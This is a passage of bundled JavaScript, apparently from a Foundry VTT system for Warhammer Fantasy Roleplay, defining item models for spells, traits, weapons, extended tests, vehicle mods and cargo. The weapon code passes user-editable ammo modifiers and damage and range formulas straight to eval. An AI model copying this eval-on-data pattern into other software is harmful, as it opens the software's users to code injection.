        // Otherwise, use config value for lore effect
        else if (game.wfrp4e.config.loreEffectDescriptions && game.wfrp4e.config.loreEffectDescriptions[this.lore.value])
            description += `<p>\n\n <b>${game.i18n.localize("SPELL.Lore")}</b> ${game.wfrp4e.config.loreEffectDescriptions[this.lore.value]}<p>`;

        this.description.value = description;
    }


    async expandData(htmlOptions) {
        let data = await super.expandData(htmlOptions);
        data.properties.push(`${game.i18n.localize("Range")}: ${this.Range}`);
        let target = this.Target;
        if (target?.includes("AoE"))
          target = `<a class='aoe-template' data-id="${this.id}" data-actor-id="${this.parent.actor.id}"><i class="fas fa-ruler-combined"></i>${target}</a>`;
        data.properties.push(`${game.i18n.localize("Target")}: ${target}`);
        data.properties.push(`${game.i18n.localize("Duration")}: ${this.Duration}`);
        if (this.magicMissile.value)
          data.properties.push(`${game.i18n.localize("Magic Missile")}: +${this.Damage}`);
        else if (this.damage.value || this.damage.dices) {
          let damage = this.Damage || "";
          if (this.damage.dice)
            damage += " + " + this.damage.dice;
          data.properties.push(`${game.i18n.localize("Damage")}: ${damage}`);
        }
        return data;
      }

      chatData() {
        let properties = [];
        if (game.wfrp4e.config.magicLores[this.lore.value])
          properties.push(`<b>${game.i18n.localize("Lore")}</b>: ${game.wfrp4e.config.magicLores[this.lore.value]}`);
        else
          properties.push(`<b>${game.i18n.localize("Lore")}</b>: ${this.lore.value}`);
        properties.push(`<b>${game.i18n.localize("CN")}</b>: ${this.cn.value}`);
        properties.push(`<b>${game.i18n.localize("Range")}</b>: ${this.range.value}`);
        properties.push(`<b>${game.i18n.localize("Target")}</b>: ${this.target.value}`);
        properties.push(`<b>${game.i18n.localize("Duration")}</b>: ${this.duration.value}`);
        if (this.damage.value)
          properties.push(`<b>${game.i18n.localize("Damage")}</b>: ${this.damage.value}`);
    
        return properties;
      }


}

let fields$6 = foundry.data.fields;

class TraitModel extends PropertiesMixin$1(BaseItemModel)
{
    static defineSchema() 
    {
        let schema = super.defineSchema();

        schema.category = new fields$6.StringField({initial : "standard"});

        schema.rollable = new fields$6.SchemaField({
            value : new fields$6.BooleanField({}),
            damage : new fields$6.BooleanField({}),
            skill : new fields$6.StringField({}),
            rollCharacteristic : new fields$6.StringField({}),
            bonusCharacteristic : new fields$6.StringField({}),
            dice : new fields$6.StringField({}),
            defaultDifficulty : new fields$6.StringField({}),
            SL : new fields$6.BooleanField({}),
            attackType : new fields$6.StringField({initial: "melee"}),
        });

        schema.specification = new fields$6.SchemaField({
            value : new fields$6.StringField(),
        });

        schema.qualities = new fields$6.SchemaField({
            value: new fields$6.ArrayField(new fields$6.ObjectField({}))
        });

        schema.flaws = new fields$6.SchemaField({
            value: new fields$6.ArrayField(new fields$6.ObjectField({}))
        });

        schema.disabled = new fields$6.BooleanField({initial : false});
    
        return schema;
    }

    get enabled() {
      return !this.disabled;
    }
    
    get isMelee()
    {
        return this.attackType == "melee";
    }

    get isRanged()
    {
        return this.attackType == "ranged";
    }

    get attackType() {
        if (this.rollable.damage)
          return this.rollable.attackType
      }

      get DisplayName() {
        return this.specification.value ? this.parent.name + " (" + this.Specification + ")" : this.parent.name;
      }


    get Damage() {
        let damage;
        let actor = this.parent.actor;
        if (this.rollable.damage)
            damage = this.Specification;
    
    
        //@HOUSE
        if (game.settings.get("wfrp4e", "mooSizeDamage") && actor.sizeNum > 3) 
        {
          if (this.rollable.bonusCharacteristic == "s") 
          {
            game.wfrp4e.utility.logHomebrew("mooSizeDamage");
            let SBsToAdd = actor.sizeNum - 3;
            damage += (actor.characteristics.s.bonus * SBsToAdd);
          }
    
        }
        //@/HOUSE
    
        return parseInt(damage || 0)
      }

      get DamageString() {
        let string = "";
        string += this.Damage;
    
        if (this.damage.dice)
          string += `+ ${this.damage.dice}`;
    
        if (this.ammo && this.ammo.damage.dice)
          string += `+ ${this.ammo.damage.dice}`;
    
        return string
      }

      get mountDamage() {

        let actor = this.parent.actor;
        if (!actor)
            return;

        if (this.attackType != "melee" || !actor.isMounted || !actor.mount)
        {
            return this.Damage
        }
    
        if (this.rollable.bonusCharacteristic == "s") 
        {
          return this.Damage + (actor.mount.characteristics[this.rollable.bonusCharacteristic].bonus - actor.characteristics[this.rollable.bonusCharacteristic].bonus)
        }
        else
        {
            return this.Damage
        }
      }

      get Specification() {

        let actor = this.parent.actor;

        let specification;
        if (this.specification.value) {
          if (this.rollable.bonusCharacteristic)  // Bonus characteristic adds to the specification (Weapon +X includes SB for example)
          {
            specification = parseInt(this.specification.value) || 0;
            specification += actor.characteristics[this.rollable.bonusCharacteristic].bonus;
            if (this.attackType && actor)
            {
              specification += (actor.flags[`${this.attackType}DamageIncrease`] || 0);
            }
          }
          else
            specification = this.specification.value;
        }
        return specification
      }
    
      get SpecificationBonus() {
        return this.parent.actor?.characteristics[this.rollable.bonusCharacteristic].bonus
      }

    computeBase() 
    {
        super.computeBase();
    }

    computeOwnerDerived(actor) 
    {

    }
      
    getSkillToUse(actor) {
        actor = actor || this.parent.actor;
        let skills = actor?.getItemTypes("skill") || [];
        let skill = skills.find(i => i.name == this.rollable.skill);
        return skill;
    }


    chatData() {
        let properties = [];
        if (this.specification.value)
          properties.push(`<b>${game.i18n.localize("Specification")}: </b> ${this.specification.value}`);
        return properties;
      }


    shouldTransferEffect(effect) {
        return this.enabled;
    }

}

let fields$5 = foundry.data.fields;

class WeaponModel extends PropertiesMixin$1(PhysicalItemModel) {
    static defineSchema() {
        let schema = super.defineSchema();
        schema.damage = new fields$5.SchemaField({
            value: new fields$5.StringField({ initial: "" })
        });
        schema.weaponGroup = new fields$5.SchemaField({
            value: new fields$5.StringField({ initial: "basic" })
        });
        schema.reach = new fields$5.SchemaField({
            value: new fields$5.StringField({ initial: "" })
        });
        schema.range = new fields$5.SchemaField({
            value: new fields$5.StringField({ initial: "" })
        });
        schema.skill = new fields$5.SchemaField({
            value: new fields$5.StringField({ initial: "" })
        });
        schema.modeOverride = new fields$5.SchemaField({
            value: new fields$5.StringField({ initial: "" })
        });
        schema.twohanded = new fields$5.SchemaField({
            value: new fields$5.BooleanField({ initial: false })
        });
        schema.ammunitionGroup = new fields$5.SchemaField({
            value: new fields$5.StringField({ initial: "" })
        });
        schema.currentAmmo = new fields$5.SchemaField({
            value: new fields$5.StringField({ initial: "" })
        });
        schema.consumesAmmo = new fields$5.SchemaField({
            value: new fields$5.BooleanField({ initial: false })
        });
        schema.special = new fields$5.SchemaField({
            value: new fields$5.StringField({ initial: "" })
        });
        schema.loaded = new fields$5.SchemaField({
            value: new fields$5.BooleanField({ initial: false }),
            repeater: new fields$5.BooleanField({ initial: false }),
            amt: new fields$5.NumberField({ initial: 0 })
        });
        schema.offhand = new fields$5.SchemaField({
            value: new fields$5.BooleanField({ initial: false })
        });

        schema.equipped = new fields$5.BooleanField({ initial: false });

        return schema;
    }

    //#region getters 

    get isMelee() {
        return this.modeOverride?.value == "melee" || (game.wfrp4e.config.groupToType[this.weaponGroup.value] == "melee" && this.modeOverride?.value != "ranged")
    }

    get isRanged() {
        return this.modeOverride?.value == "ranged" || (game.wfrp4e.config.groupToType[this.weaponGroup.value] == "ranged" && this.modeOverride?.value != "melee")
    }

    get isEquipped() {

        return this.equipped
    }

    get WeaponGroup() {
        return game.wfrp4e.config.weaponGroups[this.weaponGroup.value]
    }

    get Reach() {
        return game.wfrp4e.config.weaponReaches[this.reach.value];
    }

    get Range() {
        return this.applyAmmoMods(this.computeWeaponFormula("range"), "range")
      }
    

    get attackType() {
        return this.modeOverride?.value || game.wfrp4e.config.groupToType[this.weaponGroup.value]
    }

    get reachNum() {
        return game.wfrp4e.config.reachNum[this.reach.value]
    }

    get ammo() {
        if (this.isRanged && this.currentAmmo?.value && this.parent.isOwned)
          return this.parent.actor.items.get(this.currentAmmo.value)
    }

    get ammoList() {
    if (this.ammunitionGroup.value == "throwing")
        return this.parent.actor.getItemTypes("weapon").filter(i => i.weaponGroup.value == "throwing")
    else 
        return this.parent.actor.getItemTypes("ammunition").filter(a => a.ammunitionType.value == this.ammunitionGroup.value)
    }

    get Damage() {

        let actor = this.parent.actor;
        let damage = this.applyAmmoMods(this.computeWeaponFormula("damage"), "damage") + (actor.flags[`${this.attackType}DamageIncrease`] || 0) - Math.max((this.damageToItem.value - (this.properties.qualities.durable?.value || 0)), 0);

        //@HOUSE
        if (game.settings.get("wfrp4e", "mooSizeDamage") && actor.system instanceof StandardActorModel)
        {
          if (this.damage.value.includes("SB") && actor.sizeNum > 3)
          {
            game.wfrp4e.utility.logHomebrew("mooSizeDamage");
            let SBsToAdd = actor.sizeNum - 3;
            damage += (actor.characteristics.s.bonus * SBsToAdd);
          }
    
        }
        //@/HOUSE
    
        return parseInt(damage || 0)
      }

      get DamageString() {
        let string = this.Damage;
    
        if (this.damage.dice)
          string += `+ ${this.damage.dice}`;
    
        if (this.ammo && this.ammo.damage.dice)
          string += `+ ${this.ammo.damage.dice}`;
    
        return string
      }

      get mountDamage() {

        let actor = this.parent.actor;
        if (!actor)
            return;

        if (this.attackType != "melee" || !actor.isMounted || !actor.mount)
        {
            return this.Damage
        }
                                                                                                                                // Account for Durable, Math.max so durable doesn't go past damageToItem
        return this.applyAmmoMods(this.computeWeaponFormula("damage", actor.mount), "damage") + (actor.flags[`${this.attackType}DamageIncrease`] || 0) - Math.max((this.damageToItem.value - (this.properties.qualities.durable?.value || 0)), 0)

      }

      //#endregion


    async preCreateData(data, options, user) {
        let preCreateData = await super.preCreateData(data, options, user);

        if (this.parent.isOwned && this.parent.actor.type != "character" && this.parent.actor.type != "vehicle") {
            foundry.utils.setProperty(preCreateData, "system.equipped", true); // TODO: migrate this into a unified equipped property
        }

        return preCreateData;
    }


    async preUpdateChecks(data) {
        await super.preUpdateChecks(data);

        if (this.weaponGroup.value == "throwing" && foundry.utils.getProperty(data, "system.ammunitionGroup.value") == "throwing") {
            delete data.system.ammunitionGroup.value;
            return ui.notifications.notify(game.i18n.localize("SHEET.ThrowingAmmoError"))
        }
    }

    toggleEquip()
    {
        return this.parent.update({"system.equipped" : !this.isEquipped})
    }

    get usesHands()
    {
        let actor = this.parent?.actor;
        let locations = [];
        if (actor && this.isEquipped)
        {
            if (this.twohanded.value)
            {
                locations = locations.concat(["rArm", "lArm"]);
            }
            else if (this.offhand.value)
            {
                locations.push(actor.secondaryArmLoc);
            }
            else 
            {
                locations.push(actor.mainArmLoc);
            }
        }
        return locations;
    }

    get properties() {
        if (this._properties)
        {
            return this._properties;
        }

        let properties = super.properties;
        properties.unusedQualities = {},
        properties.inactiveQualities = {};

        //TODO: Don't like having to check for type here
        if (this.parent.isOwned && !this.skillToUse && this.parent.actor.type != "vehicle") {
            properties.unusedQualities = properties.qualities;
            properties.qualities = {};
            if (this.ammo)
                properties.qualities = this.ammo.properties.qualities;
        }

        if (this.parent.isOwned) {
            for (let prop in properties.qualities) {
                let property = properties.qualities[prop];
                if (Number.isNumeric(property.group) && !property.active) {
                    properties.inactiveQualities[prop] = property;
                    delete properties.qualities[prop];
                }
            }
        }

        properties.special = this.special?.value;
        if (this.ammo)
            properties.specialAmmo = this.ammo.properties.special;

        return properties;
    }


    computeOwned() {

        if (this.weaponGroup.value == "blackpowder")
        {
            let effect = foundry.utils.deepClone(game.wfrp4e.utility.getSystemEffects().blackpowder);
            effect.flags.wfrp4e.applicationData.type = "target";
            this.weaponGroup.effect = new ActiveEffect.implementation(effect, {parent : this.parent});
        }

        if (this.isRanged && this.ammo && (this.skillToUse || this.parent.actor.type == "vehicle"))
            this._addProperties(this.ammo.properties);

        if (this.weaponGroup.value == "flail" && !this.skillToUse && !this.flaws.value.find(i => i.name == "dangerous"))
            this.flaws.value.push({ name: "dangerous" });

        if (game.settings.get("wfrp4e", "mooQualities")) {
            game.wfrp4e.utility.logHomebrew("mooQualities");
            let momentum = this.qualities.value.find(q => q.name == "momentum" && q.value);
            if (momentum?.value && this.parent.actor.status.advantage.value > 0) {
                let qualityString = momentum.value;
                this._addProperties({ qualities: game.wfrp4e.utility.propertyStringToObject(qualityString, game.wfrp4e.utility.allProperties()), flaws: {} });
                this.qualities.value.splice(this.qualities.value.findIndex(q => q.name == "momentum"), 1);
            }
        }

        this.range.bands = this.computeRangeBands();

        if (this.loading) {
            this.loaded.max = 1;
            if (this.repeater) {
                this.loaded.max = this.repeater.value;
                if (!this.loaded.max)
                    this.loaded.max = 1;
            }
        }
    }


    reduceEquippedEncumbrance()
    {
        // Redefine this as empty to prevent subtracting encumbrance 
    }


    computeRangeBands() {

        let range = this.applyAmmoMods(this.computeWeaponFormula("range"), "range");
        if (!range || this.attackType == "melee")
            return

        let rangeBands = {};

        rangeBands[`${game.i18n.localize("Point Blank")}`] = {
            range: [0, Math.ceil(range / 10)],
            modifier: game.wfrp4e.config.difficultyModifiers[game.wfrp4e.config.rangeModifiers["Point Blank"]],
            difficulty: game.wfrp4e.config.rangeModifiers["Point Blank"]
        };
        rangeBands[`${game.i18n.localize("Short Range")}`] = {
            range: [Math.ceil(range / 10) + 1, Math.ceil(range / 2)],
            modifier: game.wfrp4e.config.difficultyModifiers[game.wfrp4e.config.rangeModifiers["Short Range"]],
            difficulty: game.wfrp4e.config.rangeModifiers["Short Range"]
        };
        rangeBands[`${game.i18n.localize("Normal")}`] = {
            range: [Math.ceil(range / 2) + 1, range],
            modifier: game.wfrp4e.config.difficultyModifiers[game.wfrp4e.config.rangeModifiers["Normal"]],
            difficulty: game.wfrp4e.config.rangeModifiers["Normal"]
        };
        rangeBands[`${game.i18n.localize("Long Range")}`] = {
            range: [range + 1, range * 2],
            modifier: game.wfrp4e.config.difficultyModifiers[game.wfrp4e.config.rangeModifiers["Long Range"]],
            difficulty: game.wfrp4e.config.rangeModifiers["Long Range"]
        };
        rangeBands[`${game.i18n.localize("Extreme")}`] = {
            range: [range * 2 + 1, range * 3],
            modifier: game.wfrp4e.config.difficultyModifiers[game.wfrp4e.config.rangeModifiers["Extreme"]],
            difficulty: game.wfrp4e.config.rangeModifiers["Extreme"]
        };

        //@HOUSE
        if (game.settings.get("wfrp4e", "mooRangeBands")) {
            game.wfrp4e.utility.logHomebrew("mooRangeBands");
            if (!this.parent.getFlag("wfrp4e", "optimalRange"))
                game.wfrp4e.utility.log("Warning: No Optimal Range set for " + this.name);

            rangeBands[`${game.i18n.localize("Point Blank")}`].modifier = this.#optimalDifference(game.i18n.localize("Point Blank")) * -20 + 20;
            delete rangeBands[`${game.i18n.localize("Point Blank")}`].difficulty;
            rangeBands[`${game.i18n.localize("Short Range")}`].modifier = this.#optimalDifference(game.i18n.localize("Short Range")) * -20 + 20;
            delete rangeBands[`${game.i18n.localize("Short Range")}`].difficulty;
            rangeBands[`${game.i18n.localize("Normal")}`].modifier = this.#optimalDifference(game.i18n.localize("Normal")) * -20 + 20;
            delete rangeBands[`${game.i18n.localize("Normal")}`].difficulty;
            rangeBands[`${game.i18n.localize("Long Range")}`].modifier = this.#optimalDifference(game.i18n.localize("Long Range")) * -20 + 20;
            delete rangeBands[`${game.i18n.localize("Long Range")}`].difficulty;
            rangeBands[`${game.i18n.localize("Extreme")}`].modifier = this.#optimalDifference(game.i18n.localize("Extreme")) * -20 + 20;
            delete rangeBands[`${game.i18n.localize("Extreme")}`].difficulty;
        }
        //@/HOUSE


        // If entangling and has no ammunition (implying non-projectiles like a whip)
        if (this.weaponGroup.value == "entangling" && this.ammunitionGroup.value == "none") {
            rangeBands[`${game.i18n.localize("Point Blank")}`].modifier = 0;
            rangeBands[`${game.i18n.localize("Short Range")}`].modifier = 0;
            rangeBands[`${game.i18n.localize("Normal")}`].modifier = 0;
            rangeBands[`${game.i18n.localize("Long Range")}`].modifier = 0;
            rangeBands[`${game.i18n.localize("Extreme")}`].modifier = 0;
        }
        return rangeBands;
    }

    //@HOUSE
    #optimalDifference(range)
    {
        let keys = Object.keys(game.wfrp4e.config.rangeBands);
        let rangeKey = game.wfrp4e.utility.findKey(range, game.wfrp4e.config.rangeBands);
        let weaponRange = this.parent.getFlag("wfrp4e", "optimalRange");
        if (!weaponRange || !rangeKey)
            return 1

        return Math.abs(keys.findIndex(i => i == rangeKey) - keys.findIndex(i => i == weaponRange))
    }
    //@/HOUSE

    applyAmmoMods(value, type) {
        // If weapon ammo, just use its damage
        if (this.ammo?.type == "weapon" && type == "damage") {
            return Number(this.ammo.damage.value)
        }

        // If no ammo or has weapon ammo, don't apply mods
        if (!this.ammo || this.ammo.type == "weapon")
            return value

        let ammoValue = this.ammo[type].value;

        if (!ammoValue)
            return value

        // If range modification was handwritten, process it
        if (ammoValue.toLowerCase() == game.i18n.localize("as weapon")) ;
        else if (ammoValue.toLowerCase() == "as weapon") ;
        // Do nothing to weapon's range
        else if (ammoValue.toLowerCase() == game.i18n.localize("half weapon"))
            value /= 2;
        else if (ammoValue.toLowerCase() == "half weapon")
            value /= 2;
        else if (ammoValue.toLowerCase() == game.i18n.localize("third weapon"))
            value /= 3;
        else if (ammoValue.toLowerCase() == "third weapon")
            value /= 3;
        else if (ammoValue.toLowerCase() == game.i18n.localize("quarter weapon"))
            value /= 4;
        else if (ammoValue.toLowerCase() == "quarter weapon")
            value /= 4;
        else if (ammoValue.toLowerCase() == game.i18n.localize("twice weapon"))
            value *= 2;
        else if (ammoValue.toLowerCase() == "twice weapon")
            value *= 2;
        else // If the range modification is a formula (supports +X -X /X *X)
        {
            try {
                try // Works for + and -
                {
                    ammoValue = (0, eval)(ammoValue);
                    value = Math.floor((0, eval)(value + ammoValue));
                }
                catch // if *X and /X
                {                                      // eval (50 + "/5") = eval(50/5) = 10
                    value = Math.floor((0, eval)(value + ammoValue));
                }
            } catch (error) {
                ui.notifications.error(game.i18n.format("ERROR.AMMO_MODS", {type}));
                console.error(error, {value, type, item: this, ammo: this.ammo});
            }
        }
        return value
    }


    /**
   * Calculates a weapon's range or damage formula.
   * 
   * Takes a weapon formula for Damage or Range (SB + 4 or SBx3) and converts to a numeric value.
   * 
   * @param {String} formula formula to be processed (SBx3 => 9).
   * 
   * @return {Number} Numeric formula evaluation
   */
    computeWeaponFormula(type, mount) {
        let formula = this[type].value || 0;
        let actorToUse = this.parent.actor;
        try {
            formula = formula.toLowerCase();
            // Iterate through characteristics
            for (let ch in this.parent.actor.characteristics) {
                if (ch == "s" && mount)
                    actorToUse = mount;
                else
                    actorToUse = this.parent.actor;
                // Determine if the formula includes the characteristic's abbreviation + B (SB, WPB, etc.)
                if (formula.includes(ch.concat('b'))) {
                    // Replace that abbreviation with the Bonus value
                    formula = formula.replace(ch.concat('b'), actorToUse.characteristics[ch].bonus.toString());
                }
            }
            // To evaluate multiplication, replace x with *
            formula = formula.replace('x', '*');

            return (0, eval)(formula);
        }
        catch
        {
            return formula
        }
    }

    getSkillToUse(actor) {
        actor = actor || this.parent.actor;
        let skills = actor?.getItemTypes("skill") || [];
        let skill = skills.find(x => x.name.toLowerCase() == this.skill.value.toLowerCase());
        if (!skill) {
            skill = skills.find(x => x.name.toLowerCase().includes(`(${this.WeaponGroup.toLowerCase()})`));
        }
        return skill
    }


    /** 
     * Helper method to apply damage to an item
     * 
     * @param {number} value Damage the item by this amount
     * @param {string} type "value", "shield" or "both"
     */
    damageItem(value = 1, type="value")
    {
        let update = {};
        let broken = false;
        if (["value", "both"].includes(type))
        {

            let currentDamage = this.damageToItem.value + value;
            
            // If maxDamageTaken is undefined, there is no max
            let max = this.maxDamageTaken("value");
            if (max && currentDamage > max)
            {
                currentDamage = max;
            }
            if (currentDamage == max)
            {
                broken = true;
            }
            
            update[`system.damageToItem.value`] = currentDamage;
        }
        if (["shield", "both"].includes(type))
        {

            let currentDamage = this.damageToItem.shield + value;
            
            // If maxDamageTaken is undefined, there is no max
            let max = this.maxDamageTaken("shield");
            if (max && currentDamage > max)
            {
                currentDamage = max;
            }
           
            if (currentDamage == max)
            {
                broken = true;
            }

            update[`system.damageToItem.shield`] = currentDamage;
        }

        if (broken)
        {
            ui.notifications.notify(`${this.parent.name} broken!`);
        }

        return this.parent.update(update);
    }

    maxDamageTaken(type)
    {
        if (type == "value")
        {
            let regex = /\d{1,3}/gm;
            return Number(regex.exec(this.damage.value)[0] || 0) + Number(this.properties.qualities.durable?.value || 0) || 999
        }
        else if (type == "shield")
        {
            return Number(this.properties.qualities.shield?.value || 0)
        }
    }

    
    getOtherEffects()
    {
        let other = [];
        if (this.weaponGroup.effect)
        {
            other.push(this.weaponGroup.effect);
        }
        if (this.ammo)
        {
            other = other.concat(this.ammo.effects.contents);
        }
        return super.getOtherEffects().concat(other);
    }

    shouldTransferEffect(effect)
    {
        return super.shouldTransferEffect(effect) && (!effect.applicationData.equipTransfer || this.isEquipped)
    }


    async expandData(htmlOptions) {
        let data = await super.expandData(htmlOptions);

        if (this.weaponGroup.value)
            data.properties.push(this.WeaponGroup);
        if (this.range.value)
            data.properties.push(`${game.i18n.localize("Range")}: ${this.range.value}`);
        if (this.damage.value) {
            let damage = this.damage.value;
            if (this.damage.dice)
                damage += " + " + this.damage.dice;
            data.properties.push(`${game.i18n.localize("Damage")}: ${damage}`);
        }
        if (this.twohanded.value)
            data.properties.push(game.i18n.localize("ITEM.TwoHanded"));
        if (this.reach.value)
            data.properties.push(`${game.i18n.localize("Reach")}: ${game.wfrp4e.config.weaponReaches[this.reach.value] + " - " + game.wfrp4e.config.reachDescription[this.reach.value]}`);
        if (this.damageToItem.value)
            data.properties.push(`${game.i18n.format("ITEM.WeaponDamaged", { damage: this.damageToItem.value })}`);
        if (this.damageToItem.shield)
            data.properties.push(`${game.i18n.format("ITEM.ShieldDamaged", { damage: this.damageToItem.shield })}`);

        let itemProperties = this.OriginalQualities.concat(this.OriginalFlaws);
        for (let prop of itemProperties)
            data.properties.push("<a class ='item-property'>" + prop + "</a>");

        if (this.special.value)
            data.properties.push(`${game.i18n.localize("Special")}: ` + this.special.value);

        data.properties = data.properties.filter(p => !!p);
        return data;
    }

    chatData() {
        let properties = [
            `<b>${game.i18n.localize("Price")}</b>: ${this.price.gc || 0} ${game.i18n.localize("MARKET.Abbrev.GC")}, ${this.price.ss || 0} ${game.i18n.localize("MARKET.Abbrev.SS")}, ${this.price.bp || 0} ${game.i18n.localize("MARKET.Abbrev.BP")}`,
            `<b>${game.i18n.localize("Encumbrance")}</b>: ${this.encumbrance.value}`,
            `<b>${game.i18n.localize("Availability")}</b>: ${game.wfrp4e.config.availability[this.availability.value] || "-"}`
        ];

        if (this.weaponGroup.value)
            properties.push(`<b>${game.i18n.localize("Group")}</b>: ${this.WeaponGroup}`);
        if (this.range.value)
            properties.push(`<b>${game.i18n.localize("Range")}</b>: ${this.range.value}`);
        if (this.damage.value)
            properties.push(`<b>${game.i18n.localize("Damage")}</b>: ${this.damage.value}`);
        if (this.twohanded.value)
            properties.push(`<b>${game.i18n.localize("ITEM.TwoHanded")}</b>`);
        if (this.reach.value)
            properties.push(`<b>${game.i18n.localize("Reach")}</b>: ${game.wfrp4e.config.weaponReaches[this.reach.value] + " - " + game.wfrp4e.config.reachDescription[this.reach.value]}`);
        if (this.damageToItem.value)
            properties.push(`${game.i18n.format("ITEM.WeaponDamaged", { damage: this.damageToItem.value })}`);
        if (this.damageToItem.shield)
            properties.push(`${game.i18n.format("ITEM.ShieldDamaged", { damage: this.damageToItem.shield })}`);

        // Make qualities and flaws clickable
        if (this.qualities.value.length)
            properties.push(`<b>${game.i18n.localize("Qualities")}</b>: ${this.OriginalQualities.map(i => i = "<a class ='item-property'>" + i + "</a>").join(", ")}`);

        if (this.flaws.value.length)
            properties.push(`<b>${game.i18n.localize("Flaws")}</b>: ${this.OriginalFlaws.map(i => i = "<a class ='item-property'>" + i + "</a>").join(", ")}`);


        properties = properties.filter(p => p != game.i18n.localize("Special"));
        if (this.special.value)
            properties.push(`<b>${game.i18n.localize("Special")}</b>: ` + this.special.value);

        properties = properties.filter(p => !!p);
        return properties;
    }
}

let fields$4 = foundry.data.fields;

class ExtendedTestModel extends BaseItemModel {
    static defineSchema() {
        let schema = super.defineSchema();

        schema.SL = new fields$4.SchemaField({
            current: new fields$4.NumberField({ initial: 0 }),
            target: new fields$4.NumberField({ initial: 1 }),
        });

        schema.test = new fields$4.SchemaField({
            value: new fields$4.StringField({})
        });

        schema.negativePossible = new fields$4.SchemaField({
            value: new fields$4.BooleanField({ initial: false })
        });

        schema.failingDecreases = new fields$4.SchemaField({
            value: new fields$4.BooleanField({ initial: true })
        });

        schema.completion = new fields$4.SchemaField({
            value: new fields$4.StringField({ initial: "none" })
        });

        schema.hide = new fields$4.SchemaField({
            test: new fields$4.BooleanField({ initial: false }),
            progress: new fields$4.BooleanField({ initial: false }),
        });

        schema.difficulty = new fields$4.SchemaField({
            value: new fields$4.StringField({ initial: "challenging" })
        });

        return schema;
    }



    computeOwned() {
        this.SL.pct = 0;
        if (this.SL.target > 0)
            this.SL.pct = this.SL.current / this.SL.target * 100;
        if (this.SL.pct > 100)
            this.SL.pct = 100;
        if (this.SL.pct < 0)
            this.SL.pct = 0;
    }

    chatData() {
        let properties = [];
        let pct = 0;
        if (this.SL.target > 0)
            pct = this.SL.current / this.SL.target * 100;
        if (pct > 100)
            pct = 100;
        if (pct < 0)
            pct = 0;
        properties.push(`<b>${game.i18n.localize("Test")}</b>: ${this.test.value}`);
        if (!this.hide.test && !this.hide.progress)
            properties.push(`<div class="test-progress">
      <div class="progress-bar-container">
        <div class="progress-bar" style="width: ${pct}%"></div>
      </div>
      <span><a class="extended-SL">${this.SL.current}</a> / ${this.SL.target} SL</span>
    </div>`);

        return properties;
    }
}

let fields$3 = foundry.data.fields;

class VehicleModModel extends PhysicalItemModel
{
    static defineSchema() 
    {
        let schema = super.defineSchema();
        schema.modType = new fields$3.SchemaField({
            value : new fields$3.StringField({})
        });
        return schema;
    }

    async expandData(htmlOptions) {
        let data = await super.expandData(htmlOptions);
        data.properties = [game.wfrp4e.config.modTypes[this.modType.value]];
        return data;
      }

      chatData() {
        let properties = [
          `<b>${game.i18n.localize("VEHICLE.ModType")}</b>: ${game.wfrp4e.config.modTypes[this.modType.value]}`,
          `<b>${game.i18n.localize("Price")}</b>: ${this.price.gc || 0} ${game.i18n.localize("MARKET.Abbrev.GC")}, ${this.price.ss || 0} ${game.i18n.localize("MARKET.Abbrev.SS")}, ${this.price.bp || 0} ${game.i18n.localize("MARKET.Abbrev.BP")}`,
          `<b>${game.i18n.localize("Encumbrance")}</b>: ${this.encumbrance.value}`,
        ];
        return properties
      }
}

let fields$2 = foundry.data.fields;

class CargoModel extends PhysicalItemModel
{
    static defineSchema() 
    {
        let schema = super.defineSchema();
        schema.cargoType = new fields$2.SchemaField({
            value: new fields$2.StringField()
        });
        schema.unitPrice = new fields$2.SchemaField({
            value: new fields$2.NumberField()
        });
        schema.origin = new fields$2.SchemaField({
            value: new fields$2.StringField()
        });
        schema.quality = new fields$2.SchemaField({
            value: new fields$2.StringField({initial : "average"})
        });
        schema.tradeType = new fields$2.StringField({});
        return schema;
    }

    computeBase()
    {
        super.computeBase();
        if (this.cargoType.value != "wine" && this.cargoType.value != "brandy")
        {
            this.quality.value = "average";
        }
        if (this.tradeType == "river")
        {
          this.price.gc = this.unitPrice.value * this.encumbrance.value / 10;
        }
        else if (this.tradeType == "maritime")
          {
          this.price.gc = this.unitPrice.value * this.encumbrance.value;
        }
    }

    async expandData(htmlOptions) {
        let data = await super.expandData(htmlOptions);
    
        if (this.origin.value)
          data.properties.push(`<b>${game.i18n.localize("ITEM.Origin")}</b>: ${this.origin.value}`);
    
        if (game.wfrp4e.trade.cargoTypes)
          data.properties.push(`<b>${game.i18n.localize("ITEM.CargoType")}</b>: ${game.wfrp4e.trade.cargoTypes[this.cargoType.value]}`);
    
        if (game.wfrp4e.config.trade.qualities && (this.cargoType.value == "wine" || this.cargoType.value == "brandy"))
          data.properties.push(`<b>${game.i18n.localize("ITEM.CargoQuality")}</b>: ${game.wfrp4e.config.trade.qualities[this.quality.value]}`);
    
        return data;
      }

      chatData() {
        let properties = [];
    
        if (this.origin.value)
          properties.push(`<b>${game.i18n.localize("ITEM.Origin")}</b>: ${this.origin.value}`);
    
        if (game.wfrp4e.trade.cargoTypes)
          properties.push(`<b>${game.i18n.localize("ITEM.CargoType")}</b>: ${game.wfrp4e.trade.cargoTypes[this.cargoType.value]}`);
    
        if (game.wfrp4e.config.trade.qualities && (this.cargoType.value == "wine" || this.cargoType.value == "brandy"))
          properties.push(`<b>${game.i18n.localize("ITEM.CargoQuality")}</b>: ${game.wfrp4e.config.trade.qualities[this.quality.value]}`);
        return properties;
      }
    
}

function loadScripts() 
{
    Hooks.on("init", () => 
    {
